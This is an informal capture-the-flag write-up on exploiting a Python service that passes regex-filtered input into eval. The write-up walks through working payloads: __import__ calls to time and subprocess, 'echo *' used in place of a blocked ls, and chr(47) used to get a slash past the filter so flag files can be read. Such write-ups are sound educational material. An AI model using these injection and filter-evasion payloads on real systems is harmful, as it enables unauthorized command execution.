pretty fun challenge. so the input is passed through regex and then put into `eval`. Using this knowledge you can find ways to execute code on the system.

To start several certain characters will not work. So you will get failed attempts. I first started with finding a way to get the server to sleep.

inputting:

```

__import__('time').sleep(5)
```

got me to sleep the server. Great!

okay lets try to execute stuff on the command line, lets try:

```
__import__('os').system('echo hello')
```

shit it is blocked, hmm lets try this:


```
__import__('subprocess').getoutput('echo hello')
```

success! the server said hello

kk lets now try

```
__import__('subprocess').getoutput('ls')

```

FML it `ls` is blocked. Okay lets do this then:

```
__import__('subprocess').getoutput('echo *')
```

we can now see files! so the hint reveals we have to go to the root
may let do 

```
__import__('subprocess').getoutput('cd / && head flag*')
```

no luck, maybe I can find a way to input characters using a trick?

```
__import__('subprocess').getoutput("cd " + chr(47) + "&& head flag*")
```

DONE! 